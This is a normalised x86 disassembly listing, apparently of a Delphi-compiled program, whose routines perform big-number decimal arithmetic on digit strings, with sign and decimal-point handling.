mov dl [ ebp - 0x1 ]
sub dl 0x30
add dl [ esi ]
mov ebx eax
sub bl 0x30
sub bl dl
cmp bl 0x9
jbe r-xdata
mov eax edi
mov edx ebx
add dl 0x30
call sub_404154
mov [ esi ] 0x0
mov eax edi
mov edx ebx
add dl 0xa
add dl 0x30
call sub_404154
mov [ esi ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46a12c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46a263
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fc0
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_404378
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a26a
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
mov edx ebx
call sub_403fc0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404378
jne r-xdata
mov [ ebp - 0x19 ] 0x0
mov eax ebx
call sub_40442c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_40442c
mov [ ebp - 0x10 ] eax
mov eax ebx
call sub_40422c
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_40422c
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_42a444
mov ebx eax
mov eax esi
call sub_403f6c
test ebx ebx
jle r-xdata
cmp [ ebp - 0x19 ] 0x0
jbe r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0x1
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404278
mov [ ebp - 0x1a ] 0x30
mov edx [ ebp - 0xc ]
mov al [ edx + eax ]
mov [ ebp - 0x1a ] al
jmp r-xdata
mov [ ebp - 0x1b ] 0x30
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov al [ eax + edx ]
mov [ ebp - 0x1b ] al
jmp r-xdata
cmp ebx [ ebp - 0x14 ]
jg r-xdata
mov eax edi
sub eax ebx
mov edx [ ebp - 0x14 ]
sub edx ebx
mov [ ebp - 0x18 ] edx
cmp edi ebx
jl r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x19 ]
mov dl [ ebp - 0x1b ]
mov al [ ebp - 0x1a ]
call sub_46a070
mov ecx [ esi ]
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404278
inc ebx
dec [ ebp - 0x20 ]
jne r-xdata
sub_46a28c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46a46a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
call sub_469e10
test eax eax
jl r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404004
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_404004
mov eax esi
mov edx r-xdata
call sub_403fc0
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404004
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404004
mov eax esi
call sub_403f6c
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_403fc0
mov eax esi
mov ecx [ ebp - 0xc ]
mov edx r-xdata
call sub_404278
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404378
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404378
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404378
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404378
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_403fc0
jmp r-xdata
mov [ ebp - 0x1d ] 0x0
mov eax [ ebp - 0x8 ]
call sub_40442c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
call sub_40442c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
call sub_40422c
mov edi eax
mov eax [ ebp - 0xc ]
call sub_40422c
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_42a444
mov ebx eax
mov eax esi
call sub_403f6c
test ebx ebx
jle r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_403fc0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a471
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f90
retn
cmp [ esi ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov ebx 0x1
mov eax esi
mov edx r-xdata
call sub_403fc0
mov [ ebp - 0x1e ] 0x30
mov edx [ ebp - 0x10 ]
mov al [ edx + eax ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov [ ebp - 0x1f ] 0x30
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov al [ eax + edx ]
mov [ ebp - 0x1f ] al
jmp r-xdata
cmp ebx [ ebp - 0x18 ]
jg r-xdata
mov eax edi
sub eax ebx
mov edx [ ebp - 0x18 ]
sub edx ebx
mov [ ebp - 0x1c ] edx
cmp edi ebx
jl r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x1d ]
mov dl [ ebp - 0x1f ]
mov al [ ebp - 0x1e ]
call sub_46a0dc
mov ecx [ esi ]
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404278
inc ebx
dec [ ebp - 0x24 ]
jne r-xdata
sub_46a490
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46a669
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x1d ] al
lea eax [ ebp - 0x1c ]
push eax
mov eax ebx
call sub_40422c
push eax
mov eax esi
call sub_40422c
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx esi
mov eax ebx
call sub_469ec4
mov eax [ ebp - 0x1c ]
call sub_40442c
mov [ ebp - 0x14 ] eax
mov esi 0x1
xor edi edi
mov ebx [ ebp - 0x10 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax edi
xor edx edx
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_40832c
cmp [ ebp - 0x8 ] 0xffffff01
je r-xdata
mov eax [ ebp - 0x18 ]
call sub_40837c
mov edx [ ebp - 0x14 ]
movzx edx [ edx + ebx ]
sub edx 0x30
imul edx
imul esi
add edi eax
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
mov esi eax
dec ebx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a670
lea eax [ ebp - 0x40 ]
mov edx 0x5
call sub_403f90
lea eax [ ebp - 0x24 ]
call sub_403f6c
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40422c
mov ebx eax
sub ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
test ebx ebx
jle r-xdata
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_402b14
lea eax [ ebp - 0x2c ]
mov dl [ ebp - 0x1d ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x28 ]
mov cl 0x2
call sub_402ae4
lea edx [ ebp - 0x28 ]
lea eax [ ebp - 0x24 ]
call sub_4041d0
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov eax [ ebp - 0x4 ]
call sub_404278
jmp r-xdata
test ebx ebx
jge r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx ebx
mov edx 0x1
call sub_40448c
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
mov dl [ ebp - 0x1d ]
call sub_404154
push [ ebp - 0x34 ]
lea eax [ ebp - 0x38 ]
push eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp - 0x8 ]
call sub_40448c
push [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042ec
jmp r-xdata
lea eax [ ebp - 0x3c ]
mov dl [ ebp - 0x1d ]
call sub_404154
push [ ebp - 0x3c ]
lea ecx [ ebp - 0x40 ]
mov edx ebx
neg edx
mov al 0x30
call sub_40461c
push [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042ec
sub_46a67c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov eax esi
call sub_40422c
mov [ ebp - 0xa ] ax
mov eax esi
call sub_40442c
movsx edi [ ebp - 0xa ]
mov edx edi
dec edx
add eax edx
mov [ ebp - 0x8 ] eax
mov edx edi
inc edx
mov eax ebx
call sub_4045b8
mov eax [ ebx ]
call sub_40442c
movsx edx [ ebp - 0xa ]
add eax edx
mov [ ebp - 0x4 ] eax
push ecx
push edi
push esi
push ebx
mov bh 0xa
mov edi [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov cx [ ebp - 0xa ]
mov dx 0x0
add dl 0x30
mov [ edi ] dl
pop ebx
pop esi
pop edi
pop ecx
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
mov al [ esi ]
sub esi 0x1
sub al 0x30
mul [ ebp + 0xc ]
add ax dx
mov dx 0x0
div bh
mov dl al
add ah 0x30
mov [ edi ] ah
sub edi 0x1
sub cx 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ebx
mov eax [ ebx ]
call sub_40422c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_40448c
cmp cx 0x0
je r-xdata
sub_46a730
push ebp
mov ebp esp
push ecx
mov ecx 0xa
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46a994
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x20 ]
push eax
mov eax esi
call sub_40422c
push eax
mov eax edi
call sub_40422c
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx edi
mov eax esi
call sub_469ec4
mov eax [ ebp - 0x1c ]
call sub_40422c
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
call sub_40422c
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
call sub_40442c
mov edi eax
lea eax [ ebp - 0x10 ]
call sub_403f6c
mov esi [ ebp - 0xc ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax ebx
mov edx [ ebp - 0x14 ]
call sub_403fc0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x9
jge r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov al [ edi + esi ]
sub al 0x30
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_46a67c
mov edx [ ebp - 0x34 ]
lea eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
call sub_404278
mov eax [ ebp - 0x1c ]
call sub_40837c
xor edx edx
mov dl [ edi + esi ]
sub edx 0x30
imul edx
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_40832c
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
call sub_404278
jmp r-xdata
push ebx
mov eax [ ebx ]
call sub_40422c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_40448c
cmp [ ebp - 0x4 ] 0xffffff01
je r-xdata
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_46a12c
mov edx [ ebp - 0x38 ]
lea eax [ ebp - 0x14 ]
call sub_404004
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404234
dec esi
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a99b
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_403f90
lea eax [ ebp - 0x3c ]
mov edx 0x4
call sub_403f90
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_403f90
retn
mov eax [ ebx ]
call sub_40422c
mov esi eax
sub esi [ ebp - 0x4 ]
test esi esi
jne r-xdata
test esi esi
jle r-xdata
mov edx r-xdata
lea eax [ ebp - 0x40 ]
call sub_402b14
lea eax [ ebp - 0x44 ]
mov dl [ ebp - 0x29 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x40 ]
mov cl 0x2
call sub_402ae4
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
call sub_4041d0
mov edx [ ebp - 0x3c ]
mov ecx [ ebx ]
mov eax ebx
call sub_404278
jmp r-xdata
test esi esi
jge r-xdata
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebx ]
mov ecx esi
mov edx 0x1
call sub_40448c
push [ ebp - 0x48 ]
lea eax [ ebp - 0x4c ]
mov dl [ ebp - 0x29 ]
call sub_404154
push [ ebp - 0x4c ]
lea eax [ ebp - 0x50 ]
push eax
lea edx [ esi + 0x1 ]
mov eax [ ebx ]
mov ecx [ ebp - 0x4 ]
call sub_40448c
push [ ebp - 0x50 ]
mov eax ebx
mov edx 0x3
call sub_4042ec
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x28 ]
cmp eax 0x400
jle r-xdata
lea eax [ ebp - 0x54 ]
mov dl [ ebp - 0x29 ]
call sub_404154
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x58 ]
mov edx esi
neg edx
mov al 0x30
call sub_40461c
push [ ebp - 0x58 ]
push [ ebx ]
mov eax ebx
mov edx 0x3
call sub_4042ec
mov eax ebx
call sub_403f6c
sub_46a9b4
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x1 ]
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x2 ] al
push eax
push ebx
push ecx
push edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x1 ] 0x0
mov cl 0x0
mov ch 0x0
mov ah [ ebp + 0x8 ]
mov dl 0x0
mov dh 0x0
cmp al 0x0
je r-xdata
add dh al
mov dl 0x1
cmp cl 0x0
jne r-xdata
cmp al [ ebp - 0x2 ]
je r-xdata
cmp dh 0x6b
ja r-xdata
mov cl 0x1
mov dl 0x0
mov edi [ ebp + 0xc ]
jmp r-xdata
mov al [ edi ]
add edi 0x1
cmp dl 0x0
jne r-xdata
add ch 0x1
jmp r-xdata
cmp ch ah
ja r-xdata
add ah 0x1
pop edi
pop edx
pop ecx
pop ebx
pop eax
mov al [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0xc
mov [ ebp - 0x1 ] 0x1
sub_46aa24
push ebx
push esi
push edi
mov esi eax
mov bl 0x1
mov eax esi
call sub_40422c
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc edi
dec eax
jne r-xdata
sub dl 0x2
je r-xdata
mov dl [ esi + edi - 0x1 ]
sub dl 0x2e
je r-xdata
xor ebx ebx
jmp r-xdata
sub_46aa58
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_46aa24
test al al
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
mov eax esi
call sub_46aa24
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40442c
push eax
mov eax esi
call sub_40442c
push eax
push 0x9
call sub_46a9b4
test al al
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_46a730
mov ecx edi
mov edx esi
mov eax ebx
call sub_46a490
jmp r-xdata
sub_46aac8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46ab69
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_403fc0
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
mov eax [ ebx ]
mov edx edi
call sub_469e10
test eax eax
jge r-xdata
mov eax [ esi ]
call sub_40837c
inc eax
lea edx [ ebp - 0x8 ]
call sub_408240
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403fc0
lea ecx [ ebp - 0x10 ]
mov eax [ ebx ]
mov edx edi
call sub_46a28c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_469dd4
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ab70
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f90
retn
sub_46ab88
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46ad0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_403fc0
jmp r-xdata
mov eax [ edi ]
cmp [ eax ] 0x30
je r-xdata
push edi
mov eax [ edi ]
call sub_40422c
mov ecx eax
dec ecx
mov eax [ edi ]
mov edx 0x2
call sub_40448c
test si si
jne r-xdata
test si si
jle r-xdata
mov ecx [ edi ]
mov eax edi
mov edx r-xdata
call sub_404278
jmp r-xdata
mov eax [ edi ]
call sub_40422c
movsx edx si
neg edx
cmp eax edx
jg r-xdata
mov edx r-xdata
lea eax [ ebp - 0xc ]
call sub_402b14
lea eax [ ebp - 0x10 ]
mov edx ebx
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov cl 0x2
call sub_402ae4
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_4041d0
push [ ebp - 0x8 ]
lea ecx [ ebp - 0x14 ]
movsx edx si
mov al 0x30
call sub_40461c
push [ ebp - 0x14 ]
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4042ec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ad14
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_403f90
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov eax [ edi ]
call sub_40422c
movsx edx si
neg edx
cmp eax edx
jle r-xdata
mov eax [ edi ]
call sub_40422c
movsx edx si
neg edx
sub edx eax
lea ecx [ ebp - 0x18 ]
mov al 0x30
call sub_40461c
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_404234
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
movsx ecx si
neg ecx
mov eax [ edi ]
mov edx 0x1
call sub_40448c
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
mov edx ebx
call sub_404154
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi ]
call sub_40422c
mov ecx eax
movsx edx si
neg edx
inc edx
mov eax [ edi ]
call sub_40448c
push [ ebp - 0x24 ]
mov eax edi
mov edx 0x3
call sub_4042ec
sub_46ad2c
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40441c
xor eax eax
push ebp
push sub_46af87
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0xd ] al
lea eax [ ebp - 0x14 ]
mov dl [ ebp - 0xd ]
call sub_404154
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_404570
mov esi eax
test si si
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_40422c
mov esi eax
dec esi
mov eax ebx
mov edx r-xdata
call sub_403fc0
mov eax ebx
mov edx r-xdata
call sub_403fc0
sub si 0x2
mov eax [ ebp - 0x4 ]
call sub_40442c
mov al [ eax ]
cmp al [ ebp - 0xd ]
jne r-xdata
lea ecx [ ebp - 0x28 ]
mov edx esi
dec edx
mov eax [ ebx ]
call sub_46ab88
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_403fc0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40422c
mov edx eax
dec edx
lea ecx [ ebp - 0x24 ]
mov al 0x30
call sub_40461c
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_404278
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_404378
jne r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0xd ]
call sub_404154
mov edx [ ebp - 0x1c ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_40cd14
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_404004
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40422c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_40448c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46af8e
lea eax [ ebp - 0x34 ]
mov edx 0x9
call sub_403f90
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f90
retn
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404004
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_404004
mov eax [ ebp - 0xc ]
call sub_40422c
mov edi eax
dec edi
lea ecx [ ebp - 0x2c ]
movsx edx di
mov al 0x30
call sub_40461c
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0xc ]
call sub_404234
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_469e10
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404378
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40442c
cmp [ eax ] 0x30
je r-xdata
mov eax ebx
call sub_403f6c
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404234
mov eax ebx
mov edx r-xdata
call sub_404234
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40422c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_40448c
dec esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404378
je r-xdata
lea ecx [ ebp - 0x34 ]
mov eax [ ebx ]
mov edx esi
call sub_46ab88
mov edx [ ebp - 0x34 ]
mov eax ebx
call sub_403fc0
mov eax [ ebx ]
call sub_40422c
movsx edx di
add edx 0x40
cmp eax edx
jl r-xdata
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_46aac8
mov edx [ ebp - 0x30 ]
mov eax ebx
call sub_404234
lea eax [ ebp - 0xc ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_404278
sub_46afc0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40441c
mov eax [ ebp - 0x8 ]
call sub_40441c
xor eax eax
push ebp
push sub_46b11d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40442c
mov al [ eax ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40442c
pop edx
cmp dl [ eax ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40442c
mov bl [ eax ]
cmp bl 0x2d
je r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40442c
cmp [ eax ] 0x2d
jne r-xdata
mov al 0x1
cmp bl 0x2d
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_40442c
cmp [ eax ] 0x2d
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40422c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_40448c
mov eax [ ebp - 0x4 ]
call sub_40442c
cmp [ eax ] 0x30
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40422c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_40448c
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40422c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_40448c
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_40442c
cmp [ eax ] 0x30
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40422c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_40448c
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_46ad2c
lea ecx [ ebp - 0xc ]
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_46aa58
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403fc0
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b124
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f90
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404278
sub_46b138
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46b214
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46aa24
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404378
jne r-xdata
mov eax esi
call sub_46aa24
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404378
jne r-xdata
mov eax edi
mov edx ebx
call sub_403fc0
jmp r-xdata
test ebx ebx
je r-xdata
mov edx esi
mov eax ebx
call sub_407f68
test eax eax
jne r-xdata
mov eax edi
mov ecx ebx
mov edx r-xdata
call sub_404278
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b21b
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax edi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_404378
jne r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_46afc0
mov eax edi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov eax [ ebp - 0x4 ]
call sub_4693a4
jmp r-xdata
sub_46b284
cmp cl ch
jae r-xdata
retn
mov ah dl
add cl 0x1
cmp cl ch
jne r-xdata
lodsb [ esi ]
mov dl al
shr al 0x4
mov al 0x0
jmp r-xdata
and ah 0xf
shl ah 0x4
or ah al
mov al ah
stosb [ edi ]
add cl 0x1
jmp sub_46b284
sub_46b2bc
push ebp
mov ebp esp
push esi
push edi
push ebx
push ecx
push edx
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov cl [ ebp + 0x10 ]
mov ch [ ebp + 0xc ]
cmp cl [ ebp + 0x18 ]
ja r-xdata
sub cl [ ebp + 0x18 ]
cmp cl [ ebp + 0x18 ]
je r-xdata
